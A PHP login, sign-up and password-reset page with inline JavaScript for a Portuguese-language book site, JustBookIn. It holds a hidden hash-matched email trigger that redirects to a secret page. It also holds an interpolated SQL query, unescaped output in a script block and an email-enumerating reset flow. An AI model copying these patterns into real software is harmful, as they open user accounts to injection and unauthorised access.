<?php
require_once '../classes/Cripto.php';

session_start();

include_once('../conexao.php');

date_default_timezone_set('America/Sao_Paulo');

/*Tokens de forms*/

$_SESSION['TSFCriarConta'] = bin2hex(random_bytes(32));

if (!isset($_SESSION['TSFLogin']))
{
	$_SESSION['TSFLogin'] = bin2hex(random_bytes(32));
}
if (!isset($_SESSION['TSFReSe']))
{
	$_SESSION['TSFReSe'] = bin2hex(random_bytes(32));
}

/*Fim de tokens de forms*/


if (!isset($_SESSION['marcaPagina']))
{
	$_SESSION['marcaPagina'] = 0; //Define em qual página o livro deverá abrir. | 0 = criarConta | 1 = Login
}

if (isset($_SESSION['logado'])) // Se o usuário tentar acessar a página de criar conta mas estiver logado
{
	header('Location: ../inicio.php');
}

if (isset($_SESSION['logado'])) // Se o usuário tentar acessar a página de login e estiver logado
{
    //O mesmo bloco de código que está no arquivo Vlogin.php foi reescrito aqui ao invés de incluir o Vlogin.php para evitra bugs.
    $idUsuarioSessao = $_SESSION['idUsuario'];
	$sql = "SELECT * FROM usuario WHERE idUsuario = '$idUsuarioSessao'";
	$resultado = mysqli_query($conexao, $sql);
	$dadosLogin = mysqli_fetch_array($resultado);
	//----------------------------------------------------

	/*
	1 - Adms
	2 - Editoras
	3 - Usuário padrão
	*/
	header('Location: ../inicio.php');
}
//$tipoConta = $_POST['nomeUsuario']; Em análise
/*if (isset($_SESSION['mostrarErro']))
{
	echo '<script> alert(' . $_SESSION['mostrarErro'] . ');</script>';
}*/
if(isset($_POST['btnEntrar']))
{
	$_SESSION['marcaPagina'] = 1;
	$_SESSION['mostrarErro'] = 1;
	
	if ($_POST['tokenFrmLogin'] != $_SESSION['TSFLogin'])
	{
		$_SESSION['marcaPagina'] = 1;
		$_SESSION['telaLoginErro'] = "<li>Houve um problema com o token, tente novamente!</li>";
		$_SESSION['mostrarErro'] = 1;
		header("Location: index.php");
		die();
	}
	
	if (md5(strtolower($_POST['email'])) == '045725ac1d7280e4ba11b7b442051acb')
    {
        $_SESSION['j1407b'] = 't0';
        $_SESSION['j1407bKey'] = true;
        header('Location: ../j1407b.php');
		die();
    }
	
	$email = mysqli_escape_string($conexao, $_POST['email']); //Campo do email
	$senha = mysqli_escape_string($conexao, $_POST['senha']); //Campo da senha
    //$tipoConta = $_POST['tipoConta'];
	
	if (empty($email) or empty($senha)) //Veriicar se os campos estão vazios
	{
		$_SESSION['telaLoginErro'] = "<li>Os campos de E-mail e senha precisam ser preenchidos</li>";
	}
	else //verificando se o e-mail digitado exite
	{
		$sql = "SELECT * FROM usuario WHERE email = ?";
		$stmt = mysqli_prepare($conexao, $sql);
		if ($stmt === false) {
			die('Erro ao preparar a consulta SQL');
		}
		mysqli_stmt_bind_param($stmt, 's', $email);
		mysqli_stmt_execute($stmt);

		// Obtenha o resultado da consulta
		$result = mysqli_stmt_get_result($stmt);

		if ($result)
			$num_linhas = mysqli_num_rows($result);

		mysqli_stmt_close($stmt);
	

	//die($dadosLogin['nome']);

		if ($num_linhas > 0) //Se o email for encontrado
		{
			/////////////////////////////
			$senha = (new Cripto($senha))->getCripto();
			$sql = "SELECT * FROM usuario WHERE email = ? AND senha = ?";
			$stmt = mysqli_prepare($conexao, $sql);

			if ($stmt === false) {
				die('Erro ao preparar a consulta SQL');
			}
			mysqli_stmt_bind_param($stmt, 'ss', $email, $senha);
			mysqli_stmt_execute($stmt);
			$result = mysqli_stmt_get_result($stmt);
			
			$dadosLogin = mysqli_fetch_assoc($result);
			$num_linhas = mysqli_num_rows($result);

			mysqli_stmt_close($stmt);

			/////////////////////////////
			
			if ($num_linhas == 1) //Se a senha for encontrada e ela for igual a senha digitada
			{
                if ($dadosLogin['statusConta'] == 0) //Se a conta não tiver sido validada
                {
                    $EmailUsuarioSha1 = (new Cripto($dadosLogin['email']))->getCripto();
                    die('<center><h1>Essa conta não foi validada e não é possível fazer login.</h1>Para validar sua conta <a href="verificaEmail.php?i=' . (new Cripto($dadosLogin['idUsuario']))->getCripto(). '">clique aqui</a></center>');
                }
                else
                {
                    
				    $_SESSION['logado'] = true;
                    $_SESSION['idUsuario'] = $dadosLogin['idUsuario'];
                    $idUsuario =  $dadosLogin['idUsuario'];

                    /* HISTÓRICO DE LOGIN
                    $data = date("Y-m-d H:i:s");
                    $sqlinsert =  "insert into hisLogin (idUsuario, data) values ('$idUsuario', '$data')";
                    $resultado = @mysqli_query($conexao, $sqlinsert);
                    if (!$resultado)
                    {
                        echo '<input type="button" onclick="window.location='."'../inicio.php'".';" value="Voltar"><br><br>';
                        die('<b>Query Inválida:</b>' . @mysqli_error($conexao)); 
                    }
                    */
                        if ($dadosLogin['tipoConta'] == 3)
                        {
                            header('Location: ../inicio.php');
                        }
                        if ($dadosLogin['tipoConta'] == 2)
                        {
                            die("Você é uma editora");
                        }
                        if ($dadosLogin['tipoConta'] == 1)
                        {
                            header('Location: ../adm/painelControle.php');
                        }
                }
			}
			else //Se a senha for encontrada e ela for diferente da senha digitada
			{
				$_SESSION['telaLoginErro'] = "<li>E-mail ou senha inválidos</li>";
			}
		}
		else //Se o email não for encontrado
		{
			$_SESSION['telaLoginErro'] = "<li>E-mail ou senha inválidos</li>";
		}
	}
	
} //if btn entrar
else if (isset($_POST["btnEsqueciSenha"]))
{ 
	if ($_POST['tokenFrmReSe'] != $_SESSION['TSFReSe'])
	{
		$_SESSION['marcaPagina'] = 1;
		$_SESSION['telaLoginErro'] = "<li>Houve um problema com o token, tente novamente!</li>";
		$_SESSION['mostrarErro'] = 1;
		header("Location: index.php");
		die();
	}

	$emailES = $_POST['emailRedefineSenha']; // ES = Esqueci a Senha

	$stmt = $conexao->prepare("SELECT * FROM usuario WHERE email = ?");
	$stmt->bind_param("s", $emailES);
	$stmt->execute();

	$resultado = $stmt->get_result();
	$dadosES = $resultado->fetch_assoc();
	$num_linhas = $resultado->num_rows;
	
	$stmt->close();
	$conexao->close();
	if ($num_linhas > 0)
	{
?>
	<script>
	var confirmacao = confirm("Deseja que um link para redefinição de senha seja enviado para o email: <?php echo $dadosES['email']; ?>? Se o E-mail realmente estiver cadastrado um link para redefinição de senha será enviado.");
	if (confirmacao)
	{
		window.location.href = "verificaEmailEsqueciSenha.php?i=<?php echo (new Cripto($dadosES['idUsuario']))->getCripto(); ?>";
		document.write("Aguarde...");
	}
	</script>
	<?php
	}
	else {
		?>
	<script>//alert("Não existe uma conta para o E-mail inserido");</script>
	<?php
	}
}
?>

<?php

  // Verificar qual formulário foi enviado
  $redirFunc;
  if (isset($_POST['btnGoLogin']))
  {
      $_SESSION['$currentLocationPHP'] = 2;
  }
  if (isset($_POST['btnGoCriarConta']))
  {
      $_SESSION['$currentLocationPHP'] = 3;
  }
  if (isset($_POST['goEsqueciSenha']))
  {
      $_SESSION['$currentLocationPHP'] = 4;
  }
      ?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
     <?php include_once("../detalhesHead.php");?>
    <title>Login|JustBookIn</title>
	<script src="https://kit.fontawesome.com/b0f29e9bfe.js" crossorigin="anonymous"></script>
	<link rel="stylesheet" href="../Styles/fonte.css">
	<link rel="stylesheet" href="../Balacowork/Balacowork.css">
	<link rel="stylesheet" href="style_new.css">
</head>
<body id="bodyId">
	<?php 

	if (isset($_SESSION['telaLoginErro']) and $_SESSION['mostrarErro'] == 1)
	{
		echo '<div style="position: absolute; top: 50px; animation-name: Rotacao3d; animation-duration: 1s; z-index: 1000;" class="alert alert-danger shadow"><div class="divErro">' . $_SESSION['telaLoginErro'] . '</div></div>';
		unset($_SESSION['telaLoginErro']);
		$_SESSION['mostrarErro'] = 0;
	}
	?>
	
<?php 
	$erro;
	if (isset($_SESSION['msgErroCriarConta']))
	{
		if ($_SESSION['msgErroCriarConta'] == 1)
		{
			$erro = "As senhas não correspondem";
		}
		if ($_SESSION['msgErroCriarConta'] == 2)
		{
			$erro = "Esse email já está em uso";
		}
		if ($_SESSION['msgErroCriarConta'] == 3)
		{
			$erro = "Esse nome de usuário já está em uso";
		}
		if ($_SESSION['msgErroCriarConta'] == 4)
		{
			$erro = "As senhas devem conter ao menos 8 caracteres e no máximo 20, com ao menos:<br>1 número, 1 letra maiúscula e minúscula e 1 caractere especial";
		}
		if ($_SESSION['msgErroCriarConta'] == 5)
		{
			$erro = "Houve um problema com o token, tente novamente!";
		}
		
		echo '<div style="position: absolute; top: 50px; animation-name: Rotacao3d; animation-duration: 1s; " class="alert alert-danger shadow"><div class="divErro">' . $erro . '</div></div>';
		unset($_SESSION['msgErroCriarConta']);
	}


?>
	
    <main>
        <div class="content">
<!-- Livro -->
            <div id="livro" class="livro">
<!-- Frente do Livro -->
                <div id="c1" class="capas">
                    <div class="capasFront">
                        <div class="capaFront">
                            <div class="conteudoFront">
                                <div class="conteudo">
                                    <span style="--corSVG: var(--cor3); width: 100%"><?php include('../imagens/logotipo-justbookin.svg'); ?></span>
                                </div>
                            </div>
                        </div>
                    </div>
<!-- Dentro do Livro -->
                    <div class="capasBack">
                        <div class="capaBack">
                            <div class="pagsCapaBack">
                                <div class="paginas">
                                    <div class="pagCapaBack">
                                        <div class="conteudoBack">
                                            <div class="conteudo">
                                                <label class="txtLivro">Bem-Vindo à</label>
                                                <span style="--corSVG: var(--cor1Escuro); width: 100%; cursor: pointer" onclick="location.href='../inicio.php'"><?php include('../imagens/logo-justbookin.svg'); ?></span>
                                                <button class="btnSecundario" onclick="location.href='../inicio.php'">Voltar</button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
<!-- Página 1 -->
                <div class="dentroLivro">
                    <div class="paginasFront">
                        <div id="p1" class="paginas">
                            <div class="conteudosFront">
                                <div id="f1" class="conteudoFront">
                                    <form class="conteudo" method="POST" action="BDcriarconta.php">
										<input type="hidden" name="tokenFrmCriarConta" value="<?php echo $_SESSION['TSFCriarConta']; ?>">
                                        <h1 class="titulo">Cadastrar</h1>
                                        <div class="divLogin">
                                            <div class="container">
                                                <div class="containerCampo">
                                                    <label class="lblCampo">Nome:</label>
                                                    <input class="campo txtCampo" type="text" name="nome" id="nomeCadastrar" placeholder="Nome" value="" required>
                                                    <div class="gapErro"></div>
                                                </div>
                                                <div class="containerCampo">
                                                    <label class="lblCampo">Sobrenome:</label>
                                                    <input class="campo txtCampo" type="text" name="sobrenome" id="sobrenomeCadastrar" placeholder="Sobrenome" value="">
                                                    <div class="gapErro"></div>
                                                </div>
                                            </div>
                                            <label class="lblCampo">Nome de usuário:</label>
                                            <input class="campo txtCampo" type="text" oninput="atualizarDadosAjax(), removerEspacos()" name="nomeUsuario" placeholder="Nome de usuário" id="nomeUsuarioCadastrar" value="">
                                            <div class="gapErro">
                                                <label class="lblErro" id="idLblUsuarioErro">Esse nome de usuário já existe!</label>
                                            </div>
                                            <label class="lblCampo">E-mail:</label>
                                            <input class="campo txtCampo" oninput="atualizarDadosAjax(), removerEspacos()" placeholder="exemplo@email.com" type="email" name="email" id="emailCadastrar" value="">
                                            <div class="gapErro">
                                                <label class="lblErro" id="idLblEmailErro">Esse E-mail já está cadastrado!</label>
                                            </div>
                                            <div class="container">
                                                <div class="containerCampo">
                                                    <label class="lblCampo">Senha:</label>
                                                    <input class="campo txtCampo" placeholder="••••••••" type="password" oninput="validarSenha()" name="senha" id="senhaCadastrar" value="" required>
                                                    <div class="gapErro">
                                                        <label class="lblErro" id="idLblSenhaErro">Essa senha é muito fraca!</label>
                                                    </div>
                                                </div>
                                                <div class="containerCampo">
                                                    <label class="lblCampo">Confirme:</label>
                                                    <input class="campo txtCampo" placeholder="••••••••" type="password" name="repetirSenha" id="confirmaSenhaCadastrar" value="" required>
                                                    <div class="gapErro"></div>
                                                </div>
                                            </div>
                                            <label class="lblCampo">Data de nascimento:</label>
                                            <input class="campo txtCampo" type="date" name="data" id="dataCadastrar" value="" required>
                                            <div class="gapErro"></div>
                                            <div class="container">
                                                <input class="btnSecundario" type="button" onclick="limparCampos(); goLogin()" value="Já tem uma conta?">
                                                <input class="btnPrimario" type="submit" value="Cadastrar" name="btnCadastrar">
                                            </div>
                                            <div id="erro-senha" style="color: red;"></div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                            <div class="conteudosBack">
                                <div id="b1" class="conteudoBack">
                                    <div class="conteudo">
                                        <label class="txtLivro">Bem-Vindo à</label>
                                        <span style="--cor: var(--cor1Escuro); width: 100%; cursor: pointer" onclick="location.href='../inicio.php'"><?php include('../imagens/logo-justbookin.svg'); ?></span>
                                        <button class="btnSecundario" onclick="location.href='../inicio.php'">Voltar</button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
<!-- Página 2 -->
                    <div class="paginasFront">
                        <div id="p2" class="paginas">
                            <div class="conteudosFront">
                                <div id="f2" class="conteudoFront">
                                    <form class="conteudo" name="frmLogin" id="frmLogin" action="" method="post">
										<input type="hidden" name="tokenFrmLogin" value="<?php echo $_SESSION['TSFLogin']; ?>">
                                        <h1 class="titulo">Entrar</h1>
                                        <div class="divLogin">
                                            <label class="lblCampo"  value="">E-mail:</label>
                                            <input class="campo txtCampo" type="text" placeholder="exemplo@email.com" name="email" id="emailEntrar" value="">
                                            <div class="gapErro"></div>
                                            <label class="lblCampo">Senha:</label>
											<div class="txtCampo">
												<input class="campo txtInvisivel" type="password" placeholder="••••••••" name="senha" id="senhaEntrar" value="">
												<button class="btnMostrar" type="button" text="Exibir senha" onclick="verSenha()"><?php include('../icones/Mostrar.svg'); ?></button>
											</div>
                                            <div class="gapErro"></div>
                                            <input type="button" value="Esqueci a senha" class="btnEsqueciSenha" onclick="limparCampos(); goEsqueciSenha()">
                                            <div class="gapErro"></div>
                                            <div class="container">
                                                <input class="btnSecundario" type="button" value="Fazer Cadastro" name="btnCadastrar" onclick="limparCampos(); backCadastro()">
                                                <input class="btnPrimario" type="submit" value="Entrar" name="btnEntrar">
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                            <div class="conteudosBack">
                                <div id="b2" class="conteudoBack">
                                    <div class="conteudo">
                                        <label class="txtLivro">Digite seu endereço de email de recuperação para que possamos enviar um email para a redefinição da senha.</label>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
<!-- Página 3 -->
                    <div id="p3" class="paginas">
                        <div class="conteudosFront">
                            <div id="f3" class="conteudoFront">
                            <form class="conteudo" name="frmRe" action="" method="post">
								<input type="hidden" name="tokenFrmReSe" value="<?php echo $_SESSION['TSFReSe']; ?>">
                                        <h1 class="titulo">Redefinir senha</h1>
                                        <div class="divLogin">
                                            <label class="lblCampo">Insira o seu E-mail:</label>
                                            <input class="campo txtCampo" placeholder="exemplo@email.com" type="text" name="emailRedefineSenha" id="emailRedefinir" value="">
                                            <div class="gapErro"></div>
                                            <div class="container">
                                                <input class="btnSecundario" type="button" value="Voltar" name="btnCadastrar" onclick="limparCampos(); backLogin()">
                                                <input class="btnPrimario" type="submit" value="Prosseguir" name="btnEsqueciSenha">
                                            </div>
                                        </div>
                                    </form>
                            </div>
                        </div>
                        <div class="conteudosBack">
                            <div id="b3" class="conteudoBack">
                                <div class="conteudo">
                                    <label class="txtLivro">Verso 3</label>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
<!-- Verso do livro -->
                <div id="c2" class="capas">
                    <div class="capasFront">
                        <div class="capaFront">
                            <div class="pagsCapaFront">
                                <div class="paginas">
                                    <div class="pagCapaFront">
                                        <div class="conteudoFront">
                                            <div class="conteudo">
                                                <label class="txtLivro">Frente Contracapa</label>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div id="n1" class="nota">
                                <label class="txtNota">As senhas devem conter ao menos 8 caracteres e no máximo 20, com ao menos: 1 número, 1 letra maiúscula e minúscula e 1 caractere especial.</label>
                            </div>
                        </div>
                    </div>
                    <div class="capasBack">
                        <div class="capaBack">
                            <div class="conteudoBack">
                                <div class="conteudo">
                                    <label class="txtLivro">Verso Contracapa</label>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="botoes">
                <button id="prevBtn" class="btnPrevNext">Anterior</button>
                <button id="nextBtn" class="btnPrevNext">Próximo</button>
            </div>
        </div>
    </main>
	<?php include('../footer.php');?>
</body>
</html>

<script>
    // Referências para elementos DOM
    const prevBtn = document.querySelector("#prevBtn");
    const nextBtn = document.querySelector("#nextBtn");
    const livro = document.querySelector("#livro");

    const capa = document.querySelector("#c1");
    const contracapa = document.querySelector("#c2");

    const pagina1 = document.querySelector("#p1");
    const pagina2 = document.querySelector("#p2");
    const pagina3 = document.querySelector("#p3");

    const nota1 = document.querySelector("#n1");

    // Event Listener
    prevBtn.addEventListener("click", prevPagina);
    nextBtn.addEventListener("click", nextPagina);

    // Lógica
    let localizacaoAtual = 1;
    let numPaginas = 5;
    let maxLocalizacao = numPaginas + 1;

    function abrirLivro() {
        livro.style.transform = "translateX(calc(50% + 2vw)";
        prevBtn.style.transform = "translateX(-22vw)";
        nextBtn.style.transform = "translateX(22vw)";
    }

    function fecharLivro(estaNoInicio) {
        if(estaNoInicio) {
            livro.style.transform = "translateX(0%)";
        }
        else {
            livro.style.transform = "translateX(calc(50% + 2vw + 2vw)";
        }
        prevBtn.style.transform = "translateX(0vw)";
        nextBtn.style.transform = "translateX(0vw)";
    }

    addEventListener('DOMContentLoaded', function() {
        function goAbrirLivro() {
            if(localizacaoAtual < maxLocalizacao) {
                switch(localizacaoAtual) {
                    case 1:
                        abrirLivro();
                        capa.classList.add("virada");
                        setTimeout(function() {
                            capa.style.zIndex = -4;
                        }, 200);
					case 2:
						if (<? echo  $_SESSION['marcaPagina'] ?> == 1) { //Login
							setTimeout(function() {
								pagina1.classList.add("virada");
								setTimeout(function() {
									pagina1.style.zIndex = -3;
								}, 200);
							}, 200);
						}
                        break;
                    default:
                        throw new Error("unknown state");
                }
                localizacaoAtual++;
            }
        }
        setTimeout(function() {
            goAbrirLivro();
			if (<? echo  $_SESSION['marcaPagina'] ?> == 1) { //Login
				goAbrirLivro();
			}
        }, 500);
    });

    function goLogin() {
        if(localizacaoAtual < maxLocalizacao) {
            switch(localizacaoAtual) {
                case 2:
                    pagina1.classList.add("virada");
                    setTimeout(function() {
                        pagina1.style.zIndex = -3;
                    }, 200);
                    break;
                default:
                    throw new Error("unknown state");
            }
            localizacaoAtual++;
        }
    }

    function backCadastro() {
        if(localizacaoAtual > 1) {
            switch(localizacaoAtual) {
                case 3:
                    pagina1.classList.remove("virada");
                    setTimeout(function() {
                        pagina1.style.zIndex = 3;
                    }, 200);
                    break;
                default:
                    throw new Error("unknown state");
            }
            localizacaoAtual--;
        }
    }

    function goEsqueciSenha() {
        if(localizacaoAtual < maxLocalizacao) {
            switch(localizacaoAtual) {
                case 3:
                    pagina2.classList.add("virada");
                    setTimeout(function() {
                        pagina2.style.zIndex = -2;
                    }, 200);
                    break;
                default:
                    throw new Error("unknown state");
            }
            localizacaoAtual++;
        }
    }

    function backLogin() {
        if(localizacaoAtual > 1) {
            switch(localizacaoAtual) {
                case 4:
                    pagina2.classList.remove("virada");
                    setTimeout(function() {
                        pagina2.style.zIndex = 2;
                    }, 200);
                    break;
                default:
                    throw new Error("unknown state");
            }
            localizacaoAtual--;
        }
    }

    function prevPagina() {
        if(localizacaoAtual > 1) {
            switch(localizacaoAtual) {
                case 2:
                    fecharLivro(true);
                    capa.classList.remove("virada");
                    setTimeout(function() {
                        capa.style.zIndex = 4;
                    }, 200);
                    break;
                case 3:
                    pagina1.classList.remove("virada");
                    setTimeout(function() {
                        pagina1.style.zIndex = 3;
                    }, 200);
                    break;
                case 4:
                    pagina2.classList.remove("virada");
                    setTimeout(function() {
                        pagina2.style.zIndex = 2;
                    }, 200);
                    break;
                case 5:
                    pagina3.classList.remove("virada");
                    setTimeout(function() {
                        pagina3.style.zIndex = 1;
                    }, 200);
                    break;
                default:
                    throw new Error("unknown state");
            }
            localizacaoAtual--;
        }
    }

    function nextPagina() {
        if(localizacaoAtual < maxLocalizacao) {
            switch(localizacaoAtual) {
                case 1:
                    abrirLivro();
                    capa.classList.add("virada");
                    setTimeout(function() {
                        capa.style.zIndex = -4;
                    }, 200);
                    break;
                case 2:
                    pagina1.classList.add("virada");
                    setTimeout(function() {
                        pagina1.style.zIndex = -3;
                    }, 200);
                    break;
                case 3:
                    pagina2.classList.add("virada");
                    setTimeout(function() {
                        pagina2.style.zIndex = -2;
                    }, 200);
                    break;
                case 4:
                    pagina3.classList.add("virada");
                    setTimeout(function() {
                        pagina3.style.zIndex = -1;
                    }, 200);
                    break;
                default:
                    throw new Error("unknown state");
            }
            localizacaoAtual++;
        }
    }
</script>

<script>
    const campo = document.querySelector(".campo");

    function limparCampos() {
        campo.value = '';
    }
</script>

<script>
function removerEspacos() {
    var inputNomeUsuario = document.getElementById("nomeUsuarioCadastrar");
    var inputEmail = document.getElementById("emailCadastrar");
    inputNomeUsuario.value = inputNomeUsuario.value.replace(/\s/g, '');
    inputEmail.value = inputEmail.value.replace(/\s/g, '');
}
</script>

<script>
var lblErroSenha = document.getElementById('idLblSenhaErro');
lblErroSenha.style.display = 'none';
function validarSenha()
{
	var senha = document.getElementById("senhaCadastrar").value; //Aa1%3698521470123654
	function validarSenha(senha)
	{
		if (senha != "")
		{
			if (senha.length < 8 || senha.length > 20)
				return false;
			else
			{
				var regex = /^(?=.*[A-Z])(?=.*[a-z])(?=.*[0-9])(?=.*[!@#$%¨&*()]).{8,20}$/;
				return regex.test(senha); //verifica se a senha corresponde aos padrões
			}
		}
		else
			return true;
			
	}

	if (validarSenha(senha)) {
        lblErroSenha.style.display = 'none';
        nota1.style.transform = "translateX(0vw)";
    }
	else {
		lblErroSenha.style.display = 'block';
        nota1.style.transform = "translateX(15vw)";
    }
	
}

var lblUsuarioErro = document.getElementById("idLblUsuarioErro");
var lblEmailErro = document.getElementById("idLblEmailErro");

lblUsuarioErro.style.display = 'none';
lblEmailErro.style.display = 'none';

function atualizarDadosAjax() {
    var nomeUsuario, EmailUsuario;
	
        nomeUsuario = document.getElementById("nomeUsuarioCadastrar").value;
        EmailUsuario = document.getElementById("emailCadastrar").value;
		LblUsuarioErro = document.getElementById("idLblUsuarioErro").value;
		LblEmailErro = document.getElementById("idLblEmailErro").value;

    var xhr = new XMLHttpRequest();

    // Configura a requisição
    xhr.open("GET", "ajax/ajaxCriarConta.php?n=" + nomeUsuario + "&e=" + EmailUsuario, true);

    // Configura o cabeçalho para indicar uma requisição AJAX
    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');

    xhr.onload = function () {
		
        if (xhr.status >= 200 && xhr.status < 300) {
            // Parse JSON para obter os valores atualizados
            var dados = JSON.parse(xhr.responseText);

            // Acessa os valores do objeto JSON
            var nomeUsuarioExiste = dados.nomeUsuarioExiste;
            var emailExistente = dados.emailExistente;

            // Atualiza as classes CSS com base nos resultados
            if (nomeUsuarioExiste) {
				document.getElementById('nomeUsuarioCadastrar').classList.replace('txtCampo', 'txtErro');
				lblUsuarioErro.style.display = 'block';
            } else {
				document.getElementById('nomeUsuarioCadastrar').classList.replace('txtErro', 'txtCampo');
				lblUsuarioErro.style.display = 'none';
            }

            if (emailExistente) {
				document.getElementById('emailCadastrar').classList.replace('txtCampo', 'txtErro');
				lblEmailErro.style.display = 'block';
            } else {
				document.getElementById('emailCadastrar').classList.replace('txtErro', 'txtCampo');
				lblEmailErro.style.display = 'none';
				
            }
        } else {
            console.error("Erro na requisição AJAX: " + xhr.status);
        }
    };

    xhr.onerror = function () {
        console.error("Erro na conexão AJAX.");
    };

    xhr.send(); // Envia a solicitação
}

// Chama a função a cada 5000 milissegundos (5 segundos)
//setInterval(atualizarDadosAjax, 10000);
</script>

<script>
    function verSenha() {
        var senha = document.getElementById("senhaEntrar");
        
        if (senha.type === "password") {
            senha.type = "text";
            senha.placeholder = "Senha";

        } else {
            senha.type = "password";
            senha.placeholder = "••••••••";
        }
    }
</script>

